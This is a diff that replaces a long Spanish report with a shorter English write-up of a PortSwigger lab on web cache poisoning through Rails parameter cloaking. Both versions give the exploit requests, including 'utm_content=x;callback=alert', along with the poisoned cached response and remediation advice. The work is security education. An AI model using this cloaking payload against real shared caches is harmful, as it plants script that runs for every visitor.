@@ -1,393 +1,95 @@
 # Web Cache Poisoning via Parameter Cloaking
 
-**Lab:** Web Cache Poisoning via Parameter Cloaking  
-**Plataforma:** PortSwigger Web Security Academy  
-**Categoría:** Web Cache Poisoning  
-**Dificultad:** Practitioner  
-**Estado:** Resuelto
+## Lab Information
+
+- **Platform:** PortSwigger Web Security Academy
+- **Category:** Web Cache Poisoning
+- **Difficulty:** Practitioner
+- **Technique:** Parameter Cloaking
 
 ---
 
-# Índice
+# Executive Summary
 
-1. Resumen ejecutivo
-2. Clasificación de la vulnerabilidad
-3. Información de la vulnerabilidad
-4. Activo afectado
-5. Descripción técnica
-6. Metodología
-7. Identificación de la vulnerabilidad
-8. Explotación
-9. Evidencias
-10. Análisis de impacto
-11. Causa raíz
-12. Recomendaciones
-13. Referencias
-14. Conclusiones
+The application ignored the `utm_content` parameter when generating cache keys. By abusing Rails parameter cloaking using a semicolon (`;`), an additional `callback` parameter could be hidden inside `utm_content`.
+
+Although excluded from the cache key, the backend interpreted this hidden parameter and replaced the callback function used by `geolocate.js`.
+
+This enabled poisoning the shared cache with attacker-controlled JavaScript.
 
 ---
 
-# 1. Resumen ejecutivo
-
-La aplicación presenta una vulnerabilidad de **Web Cache Poisoning** basada en **Parameter Cloaking**.
-
-El origen del problema reside en una discrepancia entre la forma en que el **servidor backend (Rails)** interpreta determinados parámetros y la forma en que el **servidor de caché** construye la cache key.
-
-Un parámetro aparentemente inocuo (`utm_content`) puede utilizarse para ocultar otro parámetro (`callback`) mediante el separador `;`.
-
-Como consecuencia:
-
-- El backend interpreta ambos parámetros.
-- La caché únicamente considera el primero.
-
-Esto permite modificar el contenido JavaScript almacenado en caché para todos los usuarios, consiguiendo la ejecución de JavaScript arbitrario (XSS).
-
----
-
-# 2. Clasificación de la vulnerabilidad
-
-| Clasificación | Valor |
-|---------------|-------|
-| Tipo | Web Cache Poisoning |
-| Subtipo | Parameter Cloaking |
-| Impacto | Cross-Site Scripting Persistente mediante caché |
-| Severidad | Alta |
-| CWE | CWE-349 |
-| OWASP | A05 – Security Misconfiguration |
-
----
-
-# 3. Información de la vulnerabilidad
-
-## Vulnerabilidad
-
-Parameter Cloaking
-
-## Técnica
-
-Manipulación de parámetros HTTP mediante separador `;` para introducir parámetros adicionales que son interpretados por el backend pero ignorados por la cache key.
-
----
-
-# 4. Activo afectado
+# Affected Resource
 
 ```
 /js/geolocate.js
 ```
 
-El recurso es importado automáticamente desde todas las páginas:
-
-```html
-<script type="text/javascript"
-src="/js/geolocate.js?callback=setCountryCookie">
-```
-
-Por tanto, cualquier modificación del contenido cacheado afecta a todos los visitantes.
-
 ---
 
-# 5. Descripción técnica
+# Discovery
 
-El servidor devuelve un JavaScript dinámico.
+The normal request:
 
-Solicitud original:
-
-```http
+```
 GET /js/geolocate.js?callback=setCountryCookie
 ```
 
-Respuesta:
+returned:
 
 ```javascript
 setCountryCookie({"country":"United Kingdom"});
 ```
 
-El parámetro **callback** determina qué función JavaScript será ejecutada.
+Adding duplicate callback parameters showed that the last parameter controlled execution.
 
-El parámetro:
+---
 
-```
-utm_content
-```
+# Exploitation
 
-está excluido de la cache key.
-
-Sin embargo, utilizando:
+The malicious request:
 
 ```
-utm_content=x;callback=alert
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=x;callback=alert
 ```
 
-Rails interpreta internamente:
+produced:
 
-```
-utm_content=x
-
-callback=alert
+```javascript
+alert({"country":"United Kingdom"});
 ```
 
-mientras que la caché continúa considerando únicamente:
+The cache key still referenced only:
 
 ```
 callback=setCountryCookie
 ```
 
-De esta forma el contenido almacenado en caché cambia sin modificar la cache key.
+allowing every visitor to receive the poisoned JavaScript.
 
 ---
 
-# 6. Metodología
+# Impact
 
-1. Identificar un recurso cacheable.
-2. Detectar parámetros excluidos de la cache key.
-3. Descubrir la vulnerabilidad Parameter Cloaking.
-4. Modificar el callback JavaScript.
-5. Almacenar la respuesta modificada en caché.
-6. Esperar a que la víctima cargue el recurso.
+The attacker gains persistent JavaScript execution for every user requesting the cached JavaScript resource.
 
 ---
 
-# 7. Identificación de la vulnerabilidad
+# Root Cause
 
-## 7.1 Recurso cacheable
-
-```
-GET /js/geolocate.js?callback=setCountryCookie
-```
-
-Respuesta:
-
-```
-Cache-Control: max-age=35
-
-X-Cache: hit
-```
+The cache ignored `utm_content` while the backend parsed hidden parameters inside it.
 
 ---
 
-## 7.2 Callback controlable
+# Remediation
 
-Solicitud
-
-```http
-GET /js/geolocate.js?callback=setCountryCookie&callback=alert
-```
-
-Respuesta
-
-```javascript
-alert({"country":"United Kingdom"});
-```
-
-Esto demuestra que el backend utiliza el último parámetro `callback`.
+- Disable parameter cloaking.
+- Normalize query parameters before caching.
+- Reject duplicate parameters.
+- Include all interpreted parameters in the cache key.
 
 ---
 
-## 7.3 Descubrimiento de Parameter Cloaking
+# Result
 
-Solicitud
-
-```http
-GET /js/geolocate.js?callback=setCountryCookie&utm_content=x;callback=alert
-```
-
-En HTTP/2 el backend no interpretaba correctamente el parámetro oculto.
-
-Sin embargo, utilizando HTTP/1.1:
-
-```http
-GET /js/geolocate.js?callback=setCountryCookie&utm_content=x;callback=alert HTTP/1.1
-```
-
-la respuesta fue:
-
-```javascript
-alert({"country":"United Kingdom"});
-```
-
-confirmando la vulnerabilidad.
-
----
-
-# 8. Explotación
-
-## Paso 1
-
-Modificar el callback utilizando Parameter Cloaking.
-
-```http
-GET /js/geolocate.js?callback=setCountryCookie&utm_content=x;callback=alert HTTP/1.1
-```
-
----
-
-## Paso 2
-
-Repetir la petición hasta obtener:
-
-```
-X-Cache: hit
-```
-
----
-
-## Paso 3
-
-La respuesta cacheada pasa a contener:
-
-```javascript
-alert({"country":"United Kingdom"});
-```
-
----
-
-## Paso 4
-
-Visitar la página principal.
-
-El navegador solicita automáticamente:
-
-```html
-<script src="/js/geolocate.js?callback=setCountryCookie">
-```
-
-Pero recibe el JavaScript envenenado almacenado en caché.
-
----
-
-## Paso 5
-
-La víctima ejecuta automáticamente:
-
-```javascript
-alert({"country":"United Kingdom"});
-```
-
----
-
-# 9. Evidencias
-
-## Recurso JavaScript original
-
-```javascript
-setCountryCookie({"country":"United Kingdom"});
-```
-
----
-
-## Callback sobrescrito
-
-```javascript
-alert({"country":"United Kingdom"});
-```
-
----
-
-## Caché envenenada
-
-```
-X-Cache: hit
-```
-
----
-
-## Confirmación
-
-Al acceder a la página principal apareció:
-
-```
-alert({"country":"United Kingdom"});
-```
-
-Posteriormente el laboratorio quedó marcado como:
-
-```
-Lab Solved
-```
-
----
-
-# 10. Análisis de impacto
-
-La vulnerabilidad permite modificar recursos JavaScript compartidos.
-
-Un atacante podría:
-
-- Ejecutar JavaScript arbitrario.
-- Robar cookies no HttpOnly.
-- Robar tokens CSRF.
-- Robar JWT.
-- Registrar pulsaciones.
-- Redirigir usuarios.
-- Ejecutar ataques de phishing.
-- Modificar completamente el comportamiento del sitio para todos los usuarios afectados por la caché.
-
-El ataque tiene una gran capacidad de propagación debido a que únicamente es necesario envenenar la caché una vez.
-
----
-
-# 11. Causa raíz
-
-La vulnerabilidad aparece por la combinación de varios errores:
-
-- Exclusión del parámetro `utm_content` de la cache key.
-- Interpretación distinta de parámetros entre la caché y Rails.
-- Aceptación del separador `;` como delimitador de parámetros.
-- Posibilidad de controlar directamente el callback JavaScript.
-
----
-
-# 12. Recomendaciones
-
-## Prioridad crítica
-
-Eliminar parámetros controlables por el usuario de recursos JavaScript dinámicos.
-
----
-
-## Prioridad alta
-
-Normalizar el procesamiento de parámetros entre frontend y backend.
-
----
-
-## Prioridad alta
-
-Incluir todos los parámetros relevantes dentro de la cache key.
-
----
-
-## Prioridad alta
-
-Evitar callbacks JSONP controlados por el usuario.
-
----
-
-## Prioridad media
-
-Aplicar CSP para reducir el impacto de posibles XSS.
-
----
-
-## Prioridad media
-
-Deshabilitar técnicas de Parameter Cloaking.
-
----
-
-# 13. Referencias
-
-- PortSwigger Web Security Academy – Web Cache Poisoning
-- PortSwigger – Parameter Cloaking
-- OWASP Web Cache Poisoning
-- CWE-349
-
----
-
-# 14. Conclusiones
-
-Este laboratorio demuestra cómo pequeñas diferencias en la interpretación de parámetros entre el servidor de caché y el backend pueden dar lugar a vulnerabilidades críticas.
-
-El uso de **Parameter Cloaking** permite ocultar parámetros que modifican el comportamiento de la aplicación sin alterar la cache key. Como resultado, un recurso JavaScript legítimo puede ser reemplazado por una versión maliciosa almacenada en caché y distribuida a todos los usuarios.
-
-Durante la resolución se observó además una diferencia relevante entre HTTP/2 y HTTP/1.1: el comportamiento esperado del backend Rails para interpretar el parámetro oculto solo se reprodujo correctamente utilizando HTTP/1.1, lo que permitió completar con éxito el ataque y resolver el laboratorio.
+**Lab Successfully Solved**
